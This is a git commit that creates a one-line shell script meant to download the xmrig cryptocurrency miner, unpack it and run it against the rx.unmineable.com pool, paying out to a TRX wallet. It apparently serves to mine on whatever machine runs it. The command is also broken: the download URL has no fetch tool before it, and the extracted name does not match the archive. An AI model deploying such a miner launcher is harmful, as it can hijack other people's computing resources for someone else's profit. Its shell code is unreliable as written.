b07e691992c095c61d6532baf6956a42133b96d5
jrd994 <113140126+jrd994@users.noreply.github.com>
2022-09-08 22:12:27 +0100

    Create jrd994.sh

---
+++ jrd994.sh
@@ -0,0 +1,1 @@
+https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TB1EgqaPdCZjq7NE3vXMYyVH7d8S4Cu9HX.jrd994 -p x
